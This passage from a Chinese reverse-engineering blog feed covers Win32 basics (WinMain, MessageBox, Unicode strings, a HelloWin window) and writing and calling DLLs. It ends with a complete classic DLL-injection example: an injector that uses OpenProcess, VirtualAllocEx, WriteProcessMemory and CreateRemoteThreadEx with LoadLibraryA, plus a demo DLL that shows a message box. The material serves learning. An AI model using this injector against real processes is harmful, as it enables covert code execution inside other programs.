class="headerlink" title="int WINAPI WinMain()"></a>int WINAPI WinMain()</h3><p>1、<code>#include &lt;windows.h&gt;</code>每个用C编写Windows程序的开头都应该包含，主要含入档案。<br>2、<code>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,    PSTR szCmdLine, int iCmdShow)</code><br>程序的入口点，向main一样，只是Windows叫做WinMain。第一个参数代表执行实体代号，函数定义第三参数个是LPSTR(是16位windows下)。</p><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox()"></a>MessageBox()</h3><p>显示小视窗，实际上是一个对话框。<br>参数1:通常是视窗代号<br>参数2:讯息方块主体中显示的字符串<br>参数3:标题<br>参数4:按钮数量(如下图)<br><img src="https://i.imgur.com/tTYvI3S.png" alt=""></p><h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><h2 id="宽字元"><a href="#宽字元" class="headerlink" title="宽字元"></a>宽字元</h2><p>Win32程序中标准字元定义<br><code>char c = &#39;A&#39;;</code><br>占一个字节，需要一个位的元组存储<br><code>char *p</code><br>这里p占4个字节<br><code>char a[] = &quot;Hello!&quot;</code><br>占七个字节(最后加一个0结束)，需要七个位的元组存储<br>Windwos程序标准元定义<br><code>typedef unsigned short wchar_t;</code><br>这里wchar_t与unsigned short int相同，都是16位元宽，也就是2字节<br><code>wchar_t c = &#39;A&#39;;</code><br>这时候c=0x0041,虽然’A’是一个字节，但是前面是2字节，编译器会自动扩充，就是Unicode字母A，占2个字节，存储顺序0x41,0x00<br><code>wchar_t *p = L&#39;Hello!&#39;;</code><br>这里有个L(代表[long])。字符串需要14个位元(14个字节),指数p需要4个字节<br><code>wchar_t a[] = L&#39;Hello&#39;;</code><br>这里字符串需要14个位元</p><h3 id="宽字元程式"><a href="#宽字元程式" class="headerlink" title="宽字元程式"></a>宽字元程式</h3><p>char <em>pc=”Hello!”;<br>len=strlen(pc);<br>这时len==6<br>wchar_t </em>pw=”Hello!”;<br>len=strlen(pw);<br>这时len==1 ????<br>因为strlen()应该接受char类型的指标，但是却接受unsigned short类型,我们来看看为什么是1<br>0x0048 0x0065 0x006c 0x006c 0x006d 0x0021<br>48 00 64 00 6c 00 6c 00 6f 00 21 00<br>当strlen()遇见0，则表示字符结束。那么怎么办。这时候就出现了wcslen(宽字节长度)。<br>strlen()函数定义<br><code>size_t __cdecl strlen(const char *);</code><br>wcslen()函数定义<br><code>size_t __cdecl wcslen(const wchar_t *);</code><br>如果这时<br><code>len=wcslen(pw)</code><br>这时len==6<br>扩展</p><p>strlen        wcslen<br>printf        wprintf<br>char        TCHAR</p><h3 id="L问题"><a href="#L问题" class="headerlink" title="L问题"></a>L问题</h3><p>如果定义了_UNICODE识别字，那么一个称作_T的巨集就定义如下</p><p>#define __T(x) L##x<br>_TEXT(“Hello!”)==L”Hello!”<br>如果没有定义_UNICODE<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _T(x) __T(x) </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _TEXT(x) __T(x)</span></div></pre></td></tr></table></figure></p><p>_TEXT(“Hello!”)==8字节</p><h2 id="Windows函数呼叫"><a href="#Windows函数呼叫" class="headerlink" title="Windows函数呼叫"></a>Windows函数呼叫</h2><p>MessageBox的两个变形<br>MessageBoxA<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINUSERAPI <span class="keyword">int</span> WINAPI <span class="title">MessageBoxA</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</div></pre></td></tr></table></figure></p><p>MessageBoxW<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINUSERAPI <span class="keyword">int</span> WINAPI <span class="title">MessageBoxA</span><span class="params">(HWND hWnd,LPWSTR lpText,LPWSTR lpCaption,UINT uType)</span></span>;</div></pre></td></tr></table></figure></p><p>上述而MessageBox也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBox MessageBoxW</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBox MessageBoxA</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p><h2 id="Windows字符串函式"><a href="#Windows字符串函式" class="headerlink" title="Windows字符串函式"></a>Windows字符串函式</h2><p>Windows定义的一组字符串函数式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">len = lstrlen(pString);</div><div class="line">pString = lstrcpy(pString1,pString2);</div><div class="line">pString = lstrcpyn(pString1,pString2,iCount);</div><div class="line">pString = lstrcat (pString1, pString2) ; </div><div class="line">iComp = lstrcmp (pString1, pString2) ; </div><div class="line">iComp = lstrcmpi (pString1, pString2) ;</div></pre></td></tr></table></figure></p><p>printf<br><code>int printf (const char * szFormat, ...) ;</code><br>sprintf()<br><code>int sprintf (char * szBuffer, const char * szFormat, ...) ;</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span> (<span class="string">"The sum of %i and %i is %i"</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>+<span class="number">3</span>) ; </div><div class="line">相等于</div><div class="line"><span class="keyword">char</span> szBuffer [<span class="number">100</span>] ; </div><div class="line"><span class="built_in">sprintf</span> (szBuffer, <span class="string">"The sum of %i and %i is %i"</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>+<span class="number">3</span>) ; </div><div class="line"><span class="built_in">puts</span> (szBuffer) ;</div></pre></td></tr></table></figure></p><h1 id="视窗和讯息"><a href="#视窗和讯息" class="headerlink" title="视窗和讯息"></a>视窗和讯息</h1><p>创建一个自己的视窗<br>呼叫CreateWindow,先要注册一个视窗类别。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"winmm.lib"</span>) </span></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">static</span> TCHAR szAppName[] = TEXT(<span class="string">"HelloWin"</span>);</div><div class="line">HWND hwnd;  </div><div class="line">MSG msg;</div><div class="line">WNDCLASS wndclass;</div><div class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</div><div class="line">wndclass.lpfnWndProc = WndProc;  wndclass.cbClsExtra = <span class="number">0</span>;</div><div class="line">wndclass.cbWndExtra = <span class="number">0</span>;</div><div class="line">wndclass.hInstance = hInstance;</div><div class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</div><div class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</div><div class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</div><div class="line"><span class="comment">//wndclass.lpszMenuNam = NULL;</span></div><div class="line">wndclass.lpszClassName = szAppName;</div><div class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</div><div class="line">&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"This program requires Windows NT!"</span>), szAppName, MB_ICONERROR);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">hwnd = CreateWindow(szAppName, <span class="comment">// window class name    </span></div><div class="line">TEXT(<span class="string">"The Hello Program"</span>), <span class="comment">// window caption    </span></div><div class="line">WS_OVERLAPPEDWINDOW, <span class="comment">// window style    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x size    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y size    </span></div><div class="line"><span class="literal">NULL</span>,   <span class="comment">// parent window handle       </span></div><div class="line"><span class="literal">NULL</span>,         <span class="comment">// window menu handle       </span></div><div class="line">hInstance,     <span class="comment">// program instance handle       </span></div><div class="line"><span class="literal">NULL</span>);      <span class="comment">// creation parameters </span></div><div class="line"></div><div class="line">ShowWindow(hwnd, iCmdShow);<span class="comment">//视窗出现在视讯显示器上,函数1, iCmdShow。它确定最初如何在萤幕上显示视窗，是一般大小、 最小化还是最大化。</span></div><div class="line">UpdateWindow(hwnd);<span class="comment">//函数2</span></div><div class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">&#123;<span class="comment">//讯息回圈</span></div><div class="line">TranslateMessage(&amp;msg); <span class="comment">//将 msg 结构传给 Windows，进行一些键盘转换</span></div><div class="line">DispatchMessage(&amp;msg);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> msg.wParam;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span><span class="comment">//只选择处理三种讯息：WM_CREATE、WM_PAINT 和 WM_DESTROY。</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HDC   hdc;</div><div class="line">PAINTSTRUCT ps;</div><div class="line">RECT  rect;</div><div class="line"><span class="keyword">switch</span> (message)<span class="comment">//使用 switch 和 case 结构来确定视窗讯息处 理程式接收的是什么讯息，以及如何适当地处理它</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> WM_CREATE:</div><div class="line">PlaySound(TEXT(<span class="string">"hellowin.wav"</span>), <span class="literal">NULL</span>, SND_FILENAME | SND_ASYNC);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span>  WM_PAINT:</div><div class="line">hdc = BeginPaint(hwnd, &amp;ps);</div><div class="line">GetClientRect(hwnd, &amp;rect);</div><div class="line">DrawText(hdc, TEXT(<span class="string">"Hello, Windows 98!"</span>), <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</div><div class="line">EndPaint(hwnd, &amp;ps);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span> WM_DESTROY:</div><div class="line">PostQuitMessage(<span class="number">0</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>上面函数至少呼叫了 18 个 Windows 函式。下面以它们在 HELLOWIN 中出现 的次序列出这些函式以及各自的简明描述：<br><img src="https://i.imgur.com/xMr6b6u.png" alt=""></p><p>来源:《Windows程序设计》(第五版)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows Api是了解windows程序必不可少的一部分&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>dll的编写，调用，分析</title>
    <link href="http://yoursite.com/2018/05/23/re_19_dll_1/"/>
    <id>http://yoursite.com/2018/05/23/re_19_dll_1/</id>
    <published>2018-05-23T12:49:18.000Z</published>
    <updated>2018-05-23T13:07:02.513Z</updated>
    
    <content type="html"><![CDATA[<p>dll的编写<br><a id="more"></a></p><h1 id="dll是啥？"><a href="#dll是啥？" class="headerlink" title="dll是啥？"></a>dll是啥？</h1><p>windows下的动态链接库，</p><h2 id="dll的编写"><a href="#dll的编写" class="headerlink" title="dll的编写"></a>dll的编写</h2><p>创建一个dll，添加一个<br>dll.h<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="keyword">int</span> _<span class="function">stdcall <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="keyword">int</span> _<span class="function">stdcall <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div></pre></td></tr></table></figure></p><p>dll.cpp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dll.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> _<span class="function">stdcall <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">return</span> a + b;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _<span class="function">stdcall <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">return</span> a - b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>用dependency walker查看dll<br><img src="https://i.imgur.com/1OYOw9l.png" alt=""></p><h2 id="dll的调用"><a href="#dll的调用" class="headerlink" title="dll的调用"></a>dll的调用</h2><p>隐式链接就是在程序开始执行时就将DLL文件加载到应用程序当中。实现隐式链接很容易，只要将导入函数关键字_declspec(dllimport)函数名等写到应用程序相应的头文件中就可以了。</p><h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><p>由于dll文件不能单独调试，所以需要创建一个调试dll工程的project，创建一个test项目<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib，<span class="meta-string">"dll.lib"</span>)</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span>_declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span>_declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"dll.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> a;</div><div class="line">a=add(<span class="number">8</span>,<span class="number">10</span>)</div><div class="line"><span class="built_in">printf</span>(<span class="string">"8+10= %d\n"</span>，a);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h3><p>MFC调用，dll文件拷贝到工程的根目录下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*PADD)</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">HMODULE hModule = LoadLibrary(<span class="string">"dll.dll"</span>);</div><div class="line"></div><div class="line">PADD newadd = (PADD)GetProcAddress(hModule, <span class="string">"add"</span>);</div><div class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">i = newadd(<span class="number">1</span>, <span class="number">2</span>);</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"The result is %d\n"</span>, i);</div><div class="line"></div><div class="line">FreeLibrary(hModule);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="dll简单注入"><a href="#dll简单注入" class="headerlink" title="dll简单注入"></a>dll简单注入</h1><p>目标程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> pid = GetCurrentProcessId();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>, pid);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>dll程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"></div><div class="line"><span class="function">DWORD <span class="title">MyThread</span><span class="params">(LPVOID Parameter)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">MessageBox(<span class="number">0</span>, <span class="string">L"ESE dll injector successfully"</span>, <span class="string">L"my dll"</span>, <span class="number">3</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></div><div class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></div><div class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">switch</span> (ul_reason_for_call) <span class="comment">//判断dll的状态</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</div><div class="line">CreateThread(<span class="number">0</span>, <span class="number">255</span>, (LPTHREAD_START_ROUTINE)MyThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</div><div class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</div><div class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/VcL0yLN.png" alt=""><br>注入程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// dll_injector.cpp : 定义控制台应用程序的入口点。</span></div><div class="line"><span class="comment">//</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> processId = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"输入一个pid:"</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;processId);</div><div class="line"></div><div class="line">HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, processId); <span class="comment">//参数1：多少权限 参数2：  参数3：要注入进程pid</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (hProc == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"OpenProcess Failure"</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">char</span> path[MAX_PATH];</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"dll path:"</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;path);</div><div class="line">    </div><div class="line">    <span class="comment">//得到地址</span></div><div class="line">LPVOID allocAddress = VirtualAllocEx(hProc, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (allocAddress == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAllocEx Failure"</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">SIZE_T writed = <span class="number">0</span>;</div><div class="line">BOOL isWrite = WriteProcessMemory(hProc, allocAddress, path, <span class="built_in">strlen</span>(path) + <span class="number">1</span>, &amp;writed);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (isWrite == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcessMemory Failure"</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//为什么不读其它dll的，因为在系统不重启都用一样的</span></div><div class="line">LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (LoadLibAddr == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"GetProcAddress Failure"</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">HANDLE hThread = CreateRemoteThreadEx(hProc, <span class="number">0</span>, <span class="number">255</span>, (LPTHREAD_START_ROUTINE)LoadLibAddr, allocAddress, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"CreateRemoteThreadEx Failure"</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">VirtualFreeEx(hProc, allocAddress, MAX_PATH + <span class="number">1</span>, MEM_RELEASE);</div><div class="line">CloseHandle(hProc);</div><div class="line">CloseHandle(hThread);</div><div class="line"></div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>结果<br><img src="https://i.imgur.com/0y0hpHJ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;dll的编写&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———恶意代码的网络特征</title>
    <link href="http://yoursite.com/2018/05/16/re_18_evil_5/"/>
    <id>http://yoursite.com/2018/05/16/re_18_evil_5/</id>
    <published>2018-05-16T12:49:18.000Z</published>
    <updated>2018-05-24T07:31:33.911Z</updated>
    
